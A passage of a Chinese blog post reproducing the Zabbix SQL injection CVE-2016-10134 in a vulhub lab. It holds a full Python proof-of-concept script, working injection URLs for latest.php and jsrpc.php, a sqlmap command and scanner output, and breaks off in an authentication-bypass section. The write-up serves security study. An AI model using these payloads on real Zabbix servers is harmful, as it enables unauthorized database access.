{"blogid": "126332025", "writerAge": "码龄2年", "writerBlogNum": "173", "writerCollect": "3208", "writerComment": "2316", "writerFan": "18533", "writerGrade": "6级", "writerIntegral": "7076", "writerName": "_PowerShell", "writerProfileAdress": "writer_image\\profile_126332025.jpg", "writerRankTotal": "1894", "writerRankWeekly": "57", "writerThumb": "2043", "writerVisitNum": "363921", "blog_read_count": "828", "blog_time": "已于 2022-08-14 16:16:10 修改", "blog_title": "[ vulhub漏洞复现篇 ] zabbix SQL注入漏洞 （CVE-2016-10134）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<blockquote>\n<h1><a id=\"__0\"></a>🍬 博主介绍</h1>\n<p>👨‍🎓 博主介绍：大家好，我是 <a href=\"https://blog.csdn.net/qq_51577576\">_PowerShell</a> ，很高兴认识大家~<br/> ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】<br/> 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋<br/> 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋<br/> 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#__0\">🍬 博主介绍</a></li><li><a href=\"#_8\">一、漏洞描述:</a></li><li><a href=\"#_10\">二、受影响版本：</a></li><li><a href=\"#Zabbix_15\">三、Zabbix指纹信息</a></li><li><a href=\"#_42\">四、基本原理：</a></li><li><a href=\"#_47\">五、环境搭建</a></li><li><a href=\"#_78\">六、漏洞复现：</a></li><li><ul><li><a href=\"#1_jsrpcphp_79\">1. jsrpc.php</a></li><li><a href=\"#2_latestphp_81\">2. latest.php</a></li><li><a href=\"#3POC_83\">3.POC验证</a></li><li><a href=\"#4POC_93\">4.POC</a></li></ul>\n</li><li><a href=\"#xray_192\">七、x-ray渗透</a></li><li><ul><li><a href=\"#1Xray_193\">1.使用X-ray监听</a></li><li><a href=\"#2_206\">2.敏感信息泄露（服务器报错信息泄露）</a></li><li><ul><li><a href=\"#_212\">直接访问所给链接</a></li></ul>\n</li><li><a href=\"#3CVE201610134_223\">3.CVE-2016-10134</a></li><li><ul><li><a href=\"#links_230\">查看links（参考链接）</a></li><li><a href=\"#1latestphp_236\">复现1（latest.php）</a></li><li><ul><li><a href=\"#guest_237\">用guest账号（密码为空）登录游客账户</a></li><li><a href=\"#Cookiezbx_sessionid16_244\">复制Cookie中zbx_sessionid后16字节</a></li><li><a href=\"#sid_248\">填充sid的值，可成功注入</a></li><li><ul><li><a href=\"#_250\">查询数据库当前用户信息</a></li><li><a href=\"#_258\">查询数据库版本信息</a></li><li><a href=\"#Sqlmap_265\">Sqlmap自动化注入</a></li></ul>\n</li></ul>\n</li><li><a href=\"#2jsrpcphp_280\">复现2（jsrpc.php）</a></li><li><ul><li><a href=\"#_282\">查询当前使用用户</a></li><li><a href=\"#_288\">查询数据库版本</a></li></ul>\n</li></ul>\n</li><li><a href=\"#4Zabbix_42__Authentication_Bypass_294\">4.Zabbix 4.2 - Authentication Bypass登录绕过</a></li><li><ul><li><a href=\"#links_301\">参看links（参考链接）</a></li><li><a href=\"#POC_305\">使用POC绕过登录</a></li></ul>\n</li><li><a href=\"#5_312\">5.存在默认密码</a></li><li><ul><li><a href=\"#links_319\">查看links（参考链接）</a></li><li><a href=\"#_327\">使用默认账号密码，登陆成功</a></li></ul>\n</li><li><a href=\"#6_336\">6.暴力破解漏洞</a></li></ul>\n</li><li><a href=\"#getshell_348\">八、getshell</a></li><li><ul><li><a href=\"#1_349\">1.环境</a></li><li><a href=\"#2_352\">2.在靶机上写入脚本</a></li><li><a href=\"#3_361\">3.攻击机监听：</a></li><li><a href=\"#4_364\">4.靶机连接</a></li><li><a href=\"#5Getshell_371\">5.Getshell失败</a></li></ul>\n</li><li><a href=\"#_376\">九、漏洞修复：</a></li><li><a href=\"#_380\">十、相应资源</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_8\"></a>一、漏洞描述:</h1>\n<blockquote>\n<p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。Zabbix 的latest.php中的toggle_ids[]或jsrpc.php种的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshell操作。</p>\n</blockquote>\n<h1><a id=\"_10\"></a>二、受影响版本：</h1>\n<pre><code class=\"prism language-bash\"><span class=\"token number\">2.2</span>.x\n<span class=\"token number\">3.3</span>.0-3.03\n</code></pre>\n<h1><a id=\"Zabbix_15\"></a>三、Zabbix指纹信息</h1>\n<pre><code class=\"prism language-bash\"> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"body_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"images/general/zabbix.ico\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>,\n        <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"header_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"zbx_sessionid\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>,\n        <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"body_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"meta name=<span class=\"token entity\" title='\\\"'>\\\"</span>author<span class=\"token entity\" title='\\\"'>\\\"</span> content=<span class=\"token entity\" title='\\\"'>\\\"</span>zabbix sia<span class=\"token entity\" title='\\\"'>\\\"</span>\"</span>\n        <span class=\"token punctuation\">}</span>,\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"banner_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"linux zabbix-\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>,\n        <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"banner_contains\"</span>,\n            <span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"zbx_sessionid\"</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h1><a id=\"_42\"></a>四、基本原理：</h1>\n<blockquote>\n<p>sql注入：简单来说就是通过寻找注入点，进行sql语句拼接，欺骗服务器，获取想要的数据。<br/> zabbix:由两部分构成，zabbix server与可选组件zabbix agent。<br/> zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能。<br/> zabbix agent需要安装在被监视的目标服务器上，它主要完成对硬件信息或与操作系统有关的内存，CPU等信息的收集</p>\n</blockquote>\n<h1><a id=\"_47\"></a>五、环境搭建</h1>\n<p><a href=\"https://blog.csdn.net/qq_51577576/article/details/125048165\">vluhub漏洞靶场搭建</a></p>\n<blockquote>\n<p>vulhub环境是：Zabbix 3.0.3<br/> 切到CVE-2016-10134漏洞目录下</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token builtin class-name\">cd</span> vulhub/zabbix/CVE-2016-10134 \n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ab4951d183aa41efb627373ad4415fd2.png\"/></p>\n<blockquote>\n<p>创建CVE-2016-10134环境</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> up -d\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\b03b4efc618c429aaba7040baa647be2.png\"/></p>\n<blockquote>\n<p>查看CVE-2016-10134环境</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> <span class=\"token function\">ps</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\cb23e434715443eb9964b804abf06168.png\"/></p>\n<blockquote>\n<p>访问CVE-2016-10134环境</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">http://ip:8080\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\8b2c5c3017c44e6482ebd61cf882a9dc.png\"/><br/> 复现玩记得关闭环境：</p>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> down\n</code></pre>\n<h1><a id=\"_78\"></a>六、漏洞复现：</h1>\n<h2><a id=\"1_jsrpcphp_79\"></a>1. jsrpc.php</h2>\n<p>（看下文X-ray–&gt;CVE-2016-10134-复现2）</p>\n<h2><a id=\"2_latestphp_81\"></a>2. latest.php</h2>\n<p>（看下文X-ray–&gt;CVE-2016-10134-复现1）</p>\n<h2><a id=\"3POC_83\"></a>3.POC验证</h2>\n<blockquote>\n<p>下面两条命令都可以使用</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">python3 CVE-2016-10134.py -t <span class=\"token number\">127.0</span>.0.1:8080\npython3 CVE-2016-10134.py --target <span class=\"token number\">127.0</span>.0.1:8080\n</code></pre>\n<blockquote>\n<p>存在漏洞<br/> 直接得到了当前用户<br/> <img alt=\"在这里插入图片描述\" src=\"image\\be3f94e382fb494f92b076053bf01990.png\"/></p>\n</blockquote>\n<h2><a id=\"4POC_93\"></a>4.POC</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token comment\"># @Time    : 2021/12/23</span>\n<span class=\"token comment\"># @Author  : TesterCC</span>\n\n<span class=\"token function\">import</span> json\n\nfrom optparse <span class=\"token function\">import</span> OptionParser\n\n<span class=\"token function\">import</span> re\n<span class=\"token function\">import</span> sys\n\nfrom requests <span class=\"token function\">import</span> session\n\n<span class=\"token comment\"># initialization</span>\nret <span class=\"token operator\">=</span> dict<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> str<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nret<span class=\"token punctuation\">[</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> list<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nss <span class=\"token operator\">=</span> session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nss.headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'Accept'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'*/*'</span>, <span class=\"token string\">'Accept-Encoding'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'gzip, deflate'</span>,\n              <span class=\"token string\">'User-Agent'</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'</span><span class=\"token punctuation\">}</span>\n\n\n<span class=\"token comment\"># CVE-2016-10134  # python3 CVE-2016-10134.py --target 127.0.0.1:8080</span>\n\ndef get_payload1<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span> -<span class=\"token operator\">&gt;</span> str:\n    payload <span class=\"token operator\">=</span> re.search<span class=\"token punctuation\">(</span>r<span class=\"token string\">\"\\[(.*\\))\\]\"</span>, text<span class=\"token punctuation\">)</span>\n    <span class=\"token builtin class-name\">return</span> payload.group<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n\ndef get_sql_injection_info<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span> -<span class=\"token operator\">&gt;</span> str:\n    sql_injection_info <span class=\"token operator\">=</span> re.search<span class=\"token punctuation\">(</span>r<span class=\"token string\">\"&lt;\\/li&gt;&lt;li&gt;(.*)\\'\\]\"</span>, text<span class=\"token punctuation\">)</span>\n    <span class=\"token builtin class-name\">return</span> sql_injection_info.group<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n\ndef attack<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>:\n    <span class=\"token string\">''</span>'login zabbix<span class=\"token string\">''</span>'\n    login_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://{}/index.php\"</span>.format<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\n\n    ret0 <span class=\"token operator\">=</span> ss.get<span class=\"token punctuation\">(</span>login_url<span class=\"token punctuation\">)</span>\n\n    cookie_dict <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span>i.name: i.value <span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> ret0.cookies<span class=\"token punctuation\">}</span>\n    <span class=\"token comment\"># get sid</span>\n    sid <span class=\"token operator\">=</span> cookie_dict.get<span class=\"token punctuation\">(</span><span class=\"token string\">'zbx_sessionid'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">16</span>:<span class=\"token punctuation\">]</span>\n\n    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">\"sid\"</span><span class=\"token builtin class-name\">:</span> sid,\n            <span class=\"token string\">\"form_refresh\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"1\"</span>,\n            <span class=\"token string\">\"name\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"\"</span>,\n            <span class=\"token string\">\"passwrd\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"\"</span>,\n            <span class=\"token string\">\"enter\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"Sign+in\"</span><span class=\"token punctuation\">}</span>\n\n    retn <span class=\"token operator\">=</span> ss.post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>login_url, <span class=\"token assign-left variable\">headers</span><span class=\"token operator\">=</span>ss.headers, <span class=\"token assign-left variable\">data</span><span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> retn.status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span>:\n        <span class=\"token comment\"># updatexml(0,concat(0xa,database()),0)</span>\n        <span class=\"token comment\"># updatexml(0,concat(0xa,version()),0)</span>\n        payload1 <span class=\"token operator\">=</span> f<span class=\"token string\">\"http://{target}/latest.php?output=ajax&amp;sid={sid}&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)\"</span>\n\n        retn2 <span class=\"token operator\">=</span> ss.get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>payload1, <span class=\"token assign-left variable\">headers</span><span class=\"token operator\">=</span>ss.headers<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> retn2.status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span>:\n            resp <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token string\">\"payload\"</span><span class=\"token builtin class-name\">:</span> get_payload1<span class=\"token punctuation\">(</span>retn2.text<span class=\"token punctuation\">)</span>,\n                <span class=\"token string\">\"info\"</span><span class=\"token builtin class-name\">:</span> get_sql_injection_info<span class=\"token punctuation\">(</span>retn2.text<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n\n            ret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'success'</span>\n            ret<span class=\"token punctuation\">[</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> resp\n\n    <span class=\"token builtin class-name\">return</span> ret\n\n\ndef main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>:\n    usage <span class=\"token operator\">=</span> <span class=\"token string\">\"Usage: python3 CVE-2016-10134.py --target &lt;target ip:port&gt;\"</span>\n    parse <span class=\"token operator\">=</span> OptionParser<span class=\"token punctuation\">(</span>usage<span class=\"token operator\">=</span>usage<span class=\"token punctuation\">)</span>\n    parse.add_option<span class=\"token punctuation\">(</span><span class=\"token string\">\"-t\"</span>, <span class=\"token string\">'--target'</span>, <span class=\"token assign-left variable\">type</span><span class=\"token operator\">=</span><span class=\"token string\">\"string\"</span>, <span class=\"token assign-left variable\">dest</span><span class=\"token operator\">=</span><span class=\"token string\">\"target\"</span>, <span class=\"token assign-left variable\">help</span><span class=\"token operator\">=</span><span class=\"token string\">\"server ip:port, e.g. 127.0.0.1:8080\"</span><span class=\"token punctuation\">)</span>\n\n    options, args <span class=\"token operator\">=</span> parse.parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> not options.target:\n        ret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'fail'</span>\n        ret<span class=\"token punctuation\">[</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"target empty\"</span>\n        print<span class=\"token punctuation\">(</span>usage<span class=\"token punctuation\">)</span>\n        sys.exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    else:\n        target <span class=\"token operator\">=</span> options.target\n\n    try:\n        attack<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\n    except Exception:\n        ret<span class=\"token punctuation\">[</span><span class=\"token string\">'status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'fail'</span>\n\n    print<span class=\"token punctuation\">(</span>json.dumps<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">))</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token builtin class-name\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h1><a id=\"xray_192\"></a>七、x-ray渗透</h1>\n<h2><a id=\"1Xray_193\"></a>1.使用X-ray监听</h2>\n<blockquote>\n<p>Xray监听</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">.<span class=\"token punctuation\">\\</span>xray_ windows_ and64. exe webscan -listen <span class=\"token number\">127.0</span>. <span class=\"token number\">0.1</span> :8888\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\78d06bf9ea8d4d82a823ca75c3849f57.png\"/></p>\n<blockquote>\n<p>火狐开启代理，与x-ray监听的端口相对应<br/> <img alt=\"在这里插入图片描述\" src=\"image\\d9468114958a475695df680856e94725.png\"/></p>\n</blockquote>\n<blockquote>\n<p>访问网站http://192.168.13.131:8080<br/> Xray就开始有产出了，产出我就不截图了。<br/> 我把产出信息copy到了下面进行分析</p>\n</blockquote>\n<h2><a id=\"2_206\"></a>2.敏感信息泄露（服务器报错信息泄露）</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: baseline<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,md5(2072517078)),0)\"</span>\nVulnType         <span class=\"token string\">\"sensitive/server-error\"</span>\n</code></pre>\n<h3><a id=\"_212\"></a>直接访问所给链接</h3>\n<blockquote>\n<p>这条信息其实就是利用的CVE-2016-10134注入楼的那个</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/jsrpc.php?type<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">mode</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">method</span><span class=\"token operator\">=</span>screen.get<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx</span><span class=\"token operator\">=</span>web.item.graph<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">resourcetype</span><span class=\"token operator\">=</span><span class=\"token number\">17</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx2</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>,concat<span class=\"token punctuation\">(</span>0xa,md5<span class=\"token punctuation\">(</span><span class=\"token number\">2072517078</span><span class=\"token punctuation\">))</span>,0<span class=\"token punctuation\">)</span>\n</code></pre>\n<p>这句话就是MD5加密2072517078，输出只有31位，updatexml可以输出32为，但是前面娶了一个连接符所以只输出了31位<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4a16eed8d5544d5da32a589e646e9519.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\2c7ae761b6a44c7b90773f3d16867f1d.png\"/></p>\n<h2><a id=\"3CVE201610134_223\"></a>3.CVE-2016-10134</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: phantasm<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nVulnType         <span class=\"token string\">\"poc-yaml-zabbix-cve-2016-10134-sqli/default\"</span>\nlinks            <span class=\"token punctuation\">[</span><span class=\"token string\">\"https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134\"</span><span class=\"token punctuation\">]</span>\n</code></pre>\n<h3><a id=\"links_230\"></a>查看links（参考链接）</h3>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\c917a020037c4316929a43e7fba1c871.png\"/></p>\n<blockquote>\n<p>发现是一个SQL注入漏洞</p>\n</blockquote>\n<h3><a id=\"1latestphp_236\"></a>复现1（latest.php）</h3>\n<h4><a id=\"guest_237\"></a>用guest账号（密码为空）登录游客账户</h4>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\6ecea4d017544d22b22a229d640de6bb.png\"/></p>\n<blockquote>\n<p>发现登录成功</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\03307daf348c457e99ce1139b5141aea.png\"/></p>\n<h4><a id=\"Cookiezbx_sessionid16_244\"></a>复制Cookie中zbx_sessionid后16字节</h4>\n<blockquote>\n<p>登录后，查看Cookie中的zbx_sessionid，复制后16位字符：916444579b8e84f1<br/> <img alt=\"在这里插入图片描述\" src=\"image\\5a61b9f864ae44c59cba84f51235e012.png\"/></p>\n</blockquote>\n<h4><a id=\"sid_248\"></a>填充sid的值，可成功注入</h4>\n<blockquote>\n<p>将这16个字符作为sid的值，访问，可见成功注入：</p>\n</blockquote>\n<h5><a id=\"_250\"></a>查询数据库当前用户信息</h5>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/latest.php?output<span class=\"token operator\">=</span>ajax<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">sid</span><span class=\"token operator\">=</span>916444579b8e84f1<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">favobj</span><span class=\"token operator\">=</span>toggle<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">toggle_open_state</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>toggle_ids<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>,concat<span class=\"token punctuation\">(</span>0xa,user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span>,0<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\c0892852688744e9bd2290918a01d26d.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\0a2c1ac489aa43fc80f4e6db6292a133.png\"/></p>\n<h5><a id=\"_258\"></a>查询数据库版本信息</h5>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/latest.php?output<span class=\"token operator\">=</span>ajax<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">sid</span><span class=\"token operator\">=</span>916444579b8e84f1<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">favobj</span><span class=\"token operator\">=</span>toggle<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">toggle_open_state</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>toggle_ids<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span>,concat<span class=\"token punctuation\">(</span>0x7e,<span class=\"token punctuation\">(</span>SELECT@@version<span class=\"token punctuation\">)</span>,0x7e<span class=\"token punctuation\">)</span>,1<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\99b6e224995f4ee3a2f4fd7740233ccd.png\"/></p>\n<h5><a id=\"Sqlmap_265\"></a>Sqlmap自动化注入</h5>\n<blockquote>\n<p>burp抓到数据包，桌面新建txt，把数据写入txt。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\6e2b43335b9945178e9b8ec00fd5b523.png\"/></p>\n</blockquote>\n<pre><code class=\"prism language-bash\">python2 sqlmap.py -r C:<span class=\"token punctuation\">\\</span>路径<span class=\"token punctuation\">\\</span>新建文本文档.txt -p toggle_ids<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n-r 指定数据包文件\n-p 指定注入字段\n</code></pre>\n<blockquote>\n<p>txt文件与sqlmap在同一目录下时不需要加路径，若不在则加绝对路径<br/> <img alt=\"在这里插入图片描述\" src=\"image\\2ece146f4c7a4884a18612848f2f8a1f.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\07299f1650bb4021b030b49e8eb284d2.png\"/></p>\n</blockquote>\n<blockquote>\n<p>Sqlmap的poc都可以用于手工验证</p>\n</blockquote>\n<h3><a id=\"2jsrpcphp_280\"></a>复现2（jsrpc.php）</h3>\n<p>》这个漏洞也可以通过jsrpc.php触发，且无需登录：</p>\n<h4><a id=\"_282\"></a>查询当前使用用户</h4>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/jsrpc.php?type<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">mode</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">method</span><span class=\"token operator\">=</span>screen.get<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx</span><span class=\"token operator\">=</span>web.item.graph<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">resourcetype</span><span class=\"token operator\">=</span><span class=\"token number\">17</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx2</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">0</span>,concat<span class=\"token punctuation\">(</span>0xa,user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">))</span>,0<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\bc82a7d12bde4633bd5a1722a0c1ff13.png\"/></p>\n<h4><a id=\"_288\"></a>查询数据库版本</h4>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080/jsrpc.php?type<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">mode</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">method</span><span class=\"token operator\">=</span>screen.get<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx</span><span class=\"token operator\">=</span>web.item.graph<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">resourcetype</span><span class=\"token operator\">=</span><span class=\"token number\">17</span><span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">profileIdx2</span><span class=\"token operator\">=</span>updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span>,concat<span class=\"token punctuation\">(</span>0x7e,<span class=\"token punctuation\">(</span>SELECT@@version<span class=\"token punctuation\">)</span>,0x7e<span class=\"token punctuation\">)</span>,1<span class=\"token punctuation\">)</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\7b5c590d226a4e1c9a031bfed64d3eb9.png\"/></p>\n<h2><a id=\"4Zabbix_42__Authentication_Bypass_294\"></a>4.Zabbix 4.2 - Authentication Bypass登录绕过</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">[</span>Vuln: phantasm<span class=\"token punctuation\">]</span>\nTarget           <span class=\"token string\">\"http://192.168.13.131:8080/\"</span>\nVulnType         <span class=\"token string\">\"poc-yaml-zabbix-authentication-bypass/default\"</span>\nlinks            <span class=\"token punctuation\">[</span><span class=\"token 